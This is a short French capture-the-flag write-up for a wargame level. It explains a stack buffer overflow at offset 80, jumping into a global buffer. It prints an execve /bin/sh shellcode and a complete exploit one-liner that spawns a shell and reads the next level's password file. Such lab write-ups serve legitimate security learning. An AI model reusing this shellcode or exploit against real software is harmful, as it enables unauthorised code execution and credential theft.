# level01

Notre shellcode:
```
\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
```

On voit que le programme attend 2 entrées.
- Un username dont les 7 premiers chars doivent être `dat_wil`
- Un password, mais ne sert à rien.

On remarque que l'on peut buffer overflow sur la stack grâce à l'input du mdp avec un offset de 80.

On va vouloir jump sur notre string global + 7 chars (pour passer `dat_wil`), et à la suite de cet input, mettre notre shellcode.

L'adresse de la globale étant `0x804a040`, on veut jump sur `0x804a047`.

```bash
(python -c 'print "dat_wil" + "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"'; python -c 'print "A"*80 + "\x47\xa0\x04\x08"'; echo "whoami; cat /home/users/level02/.pass") | ./level01
```
